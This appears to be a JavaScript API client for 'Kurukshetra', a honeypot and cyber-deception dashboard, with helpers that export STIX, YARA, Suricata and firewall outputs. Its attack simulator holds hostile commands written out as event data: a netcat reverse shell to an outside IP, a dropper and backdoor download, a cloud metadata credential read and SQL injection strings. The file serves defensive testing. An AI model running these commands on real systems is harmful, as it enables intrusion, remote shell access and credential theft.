// Kurukshetra Dynamic API Service
// Connects to local FastAPI backend (http://127.0.0.1:8000) when running locally,
// or cloud Render backend (https://kurukshetra-backend.onrender.com) when deployed.

export function getBaseUrl() {
  if (typeof window !== 'undefined') {
    const host = window.location.hostname;
    // If on localhost or 127.0.0.1, prioritize local backend unless overridden
    if (host === 'localhost' || host === '127.0.0.1') {
      if (import.meta.env.VITE_API_URL) {
        return import.meta.env.VITE_API_URL.replace(/\/$/, '');
      }
      return 'http://127.0.0.1:8000';
    }
    // On Vercel or any remote production domain, use live Render backend
    if (host.includes('vercel.app') || (!host.startsWith('192.168.') && host !== 'localhost')) {
      return 'https://kurukshetra-backend.onrender.com';
    }
  }
  if (import.meta.env.VITE_API_URL) {
    return import.meta.env.VITE_API_URL.replace(/\/$/, '');
  }
  return 'http://127.0.0.1:8000';
}

let CURRENT_BASE_URL = getBaseUrl();

export function setApiBaseUrl(url) {
  if (url) {
    CURRENT_BASE_URL = url.replace(/\/$/, '');
  }
}

// ── Fast Storage Cache Helper for Instant UI Hydration ───────────────────────
export function getCached(key, maxAgeMs = 120000) {
  try {
    const item = localStorage.getItem(`kurukshetra_${key}`);
    if (!item) return null;
    const parsed = JSON.parse(item);
    if (Date.now() - parsed.ts < maxAgeMs) {
      return parsed.data;
    }
  } catch {}
  return null;
}

export function setCached(key, data) {
  try {
    if (data) {
      localStorage.setItem(`kurukshetra_${key}`, JSON.stringify({ ts: Date.now(), data }));
    }
  } catch {}
}

async function apiFetch(path, options = {}) {
  const url = `${CURRENT_BASE_URL}${path}`;
  const controller = new AbortController();
  const timeoutMs = options.timeout || 12000;
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const res = await fetch(url, {
      headers: { 'Content-Type': 'application/json', ...options.headers },
      signal: controller.signal,
      ...options,
    });
    clearTimeout(timeoutId);
    if (!res.ok) {
      const text = await res.text().catch(() => '');
      throw new Error(`[${res.status}] ${path}: ${text}`);
    }
    const ct = res.headers.get('content-type') || '';
    if (ct.includes('application/json')) return res.json();
    return null;
  } catch (err) {
    clearTimeout(timeoutId);
    // If localhost failed, attempt fallback to Render cloud if on localhost
    if (CURRENT_BASE_URL.includes('127.0.0.1') || CURRENT_BASE_URL.includes('localhost')) {
      try {
        const fallbackUrl = `https://kurukshetra-backend.onrender.com${path}`;
        const fbRes = await fetch(fallbackUrl, {
          headers: { 'Content-Type': 'application/json', ...options.headers },
          ...options,
        });
        if (fbRes.ok) {
          const ct = fbRes.headers.get('content-type') || '';
          if (ct.includes('application/json')) return fbRes.json();
        }
      } catch {}
    }
    throw err;
  }
}

// ─── Health ──────────────────────────────────────────────────────────────────
export const checkHealth = () => apiFetch('/health', { timeout: 4000 });

// ─── Dashboard ───────────────────────────────────────────────────────────────
export const fetchDashboardSummary = async () => {
  try {
    const data = await apiFetch('/api/dashboard/summary');
    if (data) setCached('dashboard_summary', data);
    return data;
  } catch (err) {
    const cached = getCached('dashboard_summary');
    if (cached) return cached;
    throw err;
  }
};

// ─── Attacks / Sessions ──────────────────────────────────────────────────────
export const fetchAttacks = async () => {
  try {
    const data = await apiFetch('/api/attacks');
    if (data && Array.isArray(data)) setCached('attacks_list', data);
    return data;
  } catch (err) {
    const cached = getCached('attacks_list');
    if (cached) return cached;
    throw err;
  }
};

export const fetchSessionDetails = (id) => apiFetch(`/api/sessions/${id}`);
export const containSession = (id) =>
  apiFetch(`/api/sessions/${id}/contain`, { method: 'POST' });

// ─── Ingest Event (Sandbox / Live Attack Interface) ──────────────────────────
export const ingestEvent = (payload) =>
  apiFetch('/api/events', { method: 'POST', body: JSON.stringify(payload) });

// ─── IOCs ────────────────────────────────────────────────────────────────────
export const fetchIOCs = async () => {
  try {
    const data = await apiFetch('/api/iocs');
    if (data) setCached('iocs_list', data);
    return data;
  } catch (err) {
    const cached = getCached('iocs_list');
    if (cached) return cached;
    throw err;
  }
};

// ─── Attacker DNA ────────────────────────────────────────────────────────────
export const fetchAttackers = async () => {
  try {
    const data = await apiFetch('/api/attackers');
    if (data) setCached('attackers_list', data);
    return data;
  } catch (err) {
    const cached = getCached('attackers_list');
    if (cached) return cached;
    throw err;
  }
};

// ─── MITRE ATT&CK ────────────────────────────────────────────────────────────
export const fetchMitre = async (sessionId) => {
  try {
    const data = await apiFetch(sessionId ? `/api/mitre/${sessionId}` : '/api/mitre');
    if (data && !sessionId) setCached('mitre_list', data);
    return data;
  } catch (err) {
    if (!sessionId) {
      const cached = getCached('mitre_list');
      if (cached) return cached;
    }
    throw err;
  }
};

// ─── Reports ─────────────────────────────────────────────────────────────────
export const fetchReport = (sessionId) => apiFetch(`/api/reports/${sessionId}`);

// ─── AI Threat Landscape & Vulnerability Guard ──────────────────────────────
export const fetchAIThreatAnalysis = (limit = 40) =>
  apiFetch(`/api/ai/threat-analysis?limit=${limit}`);

export const explainEventWithAI = (eventData) =>
  apiFetch('/api/ai/explain-event', { method: 'POST', body: JSON.stringify(eventData) });

export const fetchVulnerabilityGuard = () =>
  apiFetch('/api/ai/vulnerability-guard');

// ─── Blockchain Evidence Integrity ──────────────────────────────────────────
export const fetchBlockchainSummary = async () => {
  try {
    const data = await apiFetch('/api/blockchain/verify');
    if (data) setCached('blockchain_summary', data);
    return data;
  } catch (err) {
    const cached = getCached('blockchain_summary');
    if (cached) return cached;
    throw err;
  }
};

export const verifyEvidence = (evidenceId) =>
  apiFetch(`/api/blockchain/verify/${evidenceId}`);

export const fetchBlockchainBlocks = (limit = 50) =>
  apiFetch(`/api/blockchain/blocks?limit=${limit}`);

export const triggerTamperDemo = () =>
  apiFetch('/api/blockchain/demo-tamper', { method: 'POST' });

export const restoreTamperDemo = () =>
  apiFetch('/api/blockchain/demo-restore', { method: 'POST' });

// ─── One-Click Simulator ─────────────────────────────────────────────────────
const SIM_IPS = [
  '185.220.101.45', '23.129.64.101', '45.142.212.100',
  '194.165.16.77', '62.102.148.69', '109.70.100.23',
];
const TARGET_IP = '192.168.1.100';

const SSH_CAMPAIGN = [
  { event_type: 'auth_attempt', event: 'Failed password for root from 185.220.101.45 port 52140', metadata: { username: 'root', success: false } },
  { event_type: 'auth_attempt', event: 'Failed password for admin from 185.220.101.45 port 52142', metadata: { username: 'admin', success: false } },
  { event_type: 'auth_attempt', event: 'Accepted password for decoy_user from 185.220.101.45 port 52144 (Honeytoken Triggered)', metadata: { username: 'decoy_user', success: true, is_decoy: true } },
  { event_type: 'command', event: 'whoami', metadata: { cwd: '/root' } },
  { event_type: 'command', event: 'uname -a', metadata: {} },
  { event_type: 'command', event: 'cat /etc/passwd', metadata: {} },
  { event_type: 'decoy_access', event: 'cat /root/.env (Honeytoken Canary File Access)', metadata: { resource: '.env', is_decoy: true } },
  { event_type: 'command', event: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', metadata: { cloud_canary: true } },
  { event_type: 'command', event: 'wget http://cdn.malicious-domain.cc/tools/dropper.sh -O /tmp/dropper.sh', metadata: {} },
  { event_type: 'command', event: 'chmod +x /tmp/dropper.sh', metadata: {} },
  { event_type: 'command', event: 'sudo -l', metadata: {} },
  { event_type: 'command', event: 'nc -e /bin/bash 185.220.101.45 9001', metadata: { c2: true } }
];

const WEB_CAMPAIGN = [
  { event_type: 'http_request', event: 'GET /robots.txt HTTP/1.1', metadata: { method: 'GET', path: '/robots.txt', user_agent: 'Nikto/2.1.6' } },
  { event_type: 'decoy_access', event: 'GET /admin/passwords.txt HTTP/1.1 (Decoy Canary Access)', metadata: { resource: 'passwords.txt', is_decoy: true } },
  { event_type: 'auth_attempt', event: "POST /api/login ' OR '1'='1' -- (SQL Injection Probe)", metadata: { injection: true } },
  { event_type: 'command', event: "GET /products?id=1 UNION SELECT null, username, password_hash FROM admin_users --", metadata: {} },
  { event_type: 'command', event: "curl http://45.142.212.100/backdoor.php -o /var/www/html/backdoor.php", metadata: {} },
  { event_type: 'command', event: "nmap -sS -p 22,80,3306,5432,6379 192.168.1.0/24", metadata: {} }
];

function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
function evtId(sessionId, n) { return `EVT-SIM-${sessionId.slice(-8)}-${String(n).padStart(3, '0')}`; }

export async function runAttackSimulation() {
  const service = Math.random() > 0.5 ? 'ssh' : 'http';
  const ip = pick(SIM_IPS);
  const sessionId = `ATK-SIM-${Date.now().toString(36).toUpperCase()}`;
  const events = service === 'ssh' ? SSH_CAMPAIGN : WEB_CAMPAIGN;
  const ts = () => new Date().toISOString();

  let last = null;
  for (let i = 0; i < events.length; i++) {
    const e = events[i];
    last = await ingestEvent({
      event_id: evtId(sessionId, i + 1),
      session_id: sessionId,
      source_ip: ip,
      target_ip: TARGET_IP,
      service,
      timestamp: ts(),
      event_type: e.event_type,
      event: e.event,
      metadata: { ...e.metadata, simulation: true, campaign: 'dashboard_one_click' },
    });
    await new Promise(r => setTimeout(r, 300));
  }
  return last;
}

// ─── Export Generators (STIX 2.1, YARA, Suricata, Firewall, CSV) ─────────────

export function downloadFile(filename, content, type = 'text/plain') {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

export function exportSTIXBundle(sessionData, iocList = []) {
  const id = sessionData?.session_id || 'KURUKSHETRA-SESSION';
  const now = new Date().toISOString();
  const bundle = {
    type: "bundle",
    id: `bundle--${crypto.randomUUID ? crypto.randomUUID() : 'stix-' + Date.now()}`,
    spec_version: "2.1",
    objects: [
      {
        type: "threat-actor",
        id: `threat-actor--${id.toLowerCase()}`,
        created: now,
        modified: now,
        name: sessionData?.fingerprint || `Attacker-${sessionData?.source_ip || 'Unknown'}`,
        description: `Threat actor identified by Kurukshetra Cyber Deception Engine targeting ${sessionData?.service || 'Honeypot'}`,
        threat_actor_types: ["cyber-espionage", "unauthorized-access"],
        sophistication: sessionData?.risk_score >= 80 ? "advanced" : "intermediate",
        resource_level: "individual",
        primary_motivation: "organizational-gain"
      },
      ...iocList.map((ioc, idx) => ({
        type: "indicator",
        id: `indicator--${idx}-${Date.now()}`,
        created: now,
        modified: now,
        name: `Captured ${ioc.ioc_type || 'IOC'}: ${ioc.value}`,
        description: `Threat indicator captured by Kurukshetra Honeypot. Category: ${ioc.threat_category || 'SUSPICIOUS'}`,
        pattern: `[${(ioc.ioc_type || 'ipv4-addr')}:value = '${ioc.value}']`,
        pattern_type: "stix",
        valid_from: now
      }))
    ]
  };
  downloadFile(`stix21-threat-bundle-${id}.json`, JSON.stringify(bundle, null, 2), 'application/json');
}

export function exportYaraRules(iocList = [], sessionData = {}) {
  const id = sessionData?.session_id || 'Kurukshetra_Capture';
  const hashes = iocList.filter(i => ['hash', 'sha256', 'md5'].includes((i.ioc_type || i.type || '').toLowerCase()));
  const urls = iocList.filter(i => ['url', 'domain'].includes((i.ioc_type || i.type || '').toLowerCase()));
  
  const yara = `/*
 * Kurukshetra Adaptive Cyber Deception Platform
 * Automated YARA Rule Generated from Honeypot Telemetry
 * Incident: ${id}
 * Timestamp: ${new Date().toISOString()}
 */

rule Kurukshetra_Threat_${id.replace(/[^a-zA-Z0-9]/g, '_')} {
    meta:
        description = "Detects payloads and indicators captured by Kurukshetra Honeypot"
        author = "Kurukshetra Cyber Deception SOC"
        reference = "https://kurukshetra.security"
        severity = "${sessionData?.risk_level || 'HIGH'}"
        date = "${new Date().toISOString().split('T')[0]}"

    strings:
        ${urls.map((u, i) => `$url_${i} = "${u.value}" ascii wide`).join('\n        ')}
        ${hashes.map((h, i) => `$hash_${i} = "${h.value}" ascii wide`).join('\n        ')}
        $canary_marker = "Honeytoken" ascii wide
        $payload_marker = "/bin/bash" ascii wide

    condition:
        any of ($url_*) or any of ($hash_*) or ($canary_marker and $payload_marker)
}
`;
  downloadFile(`kurukshetra-rules-${id}.yar`, yara, 'text/plain');
}

export function exportSuricataRules(iocList = []) {
  const ips = iocList.filter(i => ['ip', 'ipv4'].includes((i.ioc_type || i.type || '').toLowerCase()));
  let rules = `# ----------------------------------------------------------------------\n# Kurukshetra Honeypot Automated Suricata / Snort IDS Signatures\n# Generated: ${new Date().toISOString()}\n# ----------------------------------------------------------------------\n\n`;
  
  ips.forEach((ip, idx) => {
    const sid = 9000000 + idx;
    rules += `alert ip ${ip.value} any -> $HOME_NET any (msg:"KURUKSHETRA_DECEPTION - Inbound traffic from Honeypot Attacker IP [${ip.value}]"; threshold:type limit, track by_src, count 1, seconds 300; classtype:trojan-activity; sid:${sid}; rev:1;)\n`;
  });

  if (ips.length === 0) {
    rules += `alert tcp $EXTERNAL_NET any -> $HONEYPOT_NET [22,80,443,6379,6443] (msg:"KURUKSHETRA_DECEPTION - Honeypot Unauthorized Decoy Access Attempt"; flags:S; classtype:attempted-recon; sid:9000100; rev:1;)\n`;
  }
  downloadFile('kurukshetra-suricata-ids.rules', rules, 'text/plain');
}

export function exportFirewallScript(iocList = []) {
  const ips = iocList.filter(i => ['ip', 'ipv4'].includes((i.ioc_type || i.type || '').toLowerCase()));
  let script = `#!/bin/bash
# ==============================================================================
# Kurukshetra Automated Perimeter Firewall Enforcement Script
# Generated: ${new Date().toISOString()}
# ==============================================================================

echo "[+] Enforcing Kurukshetra Deception Perimeter Quarantine Rules..."

# 1. IPTables Drop Rules
${ips.map(ip => `iptables -I INPUT -s ${ip.value} -j DROP -m comment --comment "Kurukshetra Honeypot Block: ${ip.threat_category || 'Attacker'}"`).join('\n')}

# 2. UFW Rules
${ips.map(ip => `ufw deny from ${ip.value} to any comment "Kurukshetra Auto Quarantine"`).join('\n')}

# 3. AWS WAF IPSet Update (CLI Preview)
# aws wafv2 update-ip-set --name Kurukshetra-Blocklist --scope REGIONAL --id <IP_SET_ID> --addresses ${ips.map(i => `"${i.value}/32"`).join(' ')}

echo "[✓] All ${ips.length} malicious IP addresses blocked successfully!"
`;
  downloadFile('kurukshetra-firewall-block.sh', script, 'text/x-sh');
}

export function exportCSV(iocList = []) {
  let csv = 'ioc_type,value,threat_category,confidence,first_seen,last_seen,session_ids\n';
  iocList.forEach(i => {
    const type = i.ioc_type || i.type || 'unknown';
    const val = (i.value || '').replace(/"/g, '""');
    const cat = i.threat_category || 'SUSPICIOUS';
    const conf = i.confidence || 'HIGH';
    const first = i.first_seen || '';
    const last = i.last_seen || '';
    const sessions = Array.isArray(i.session_ids) ? i.session_ids.join(';') : (i.session_id || '');
    csv += `"${type}","${val}","${cat}","${conf}","${first}","${last}","${sessions}"\n`;
  });
  downloadFile('kurukshetra-iocs.csv', csv, 'text/csv');
}
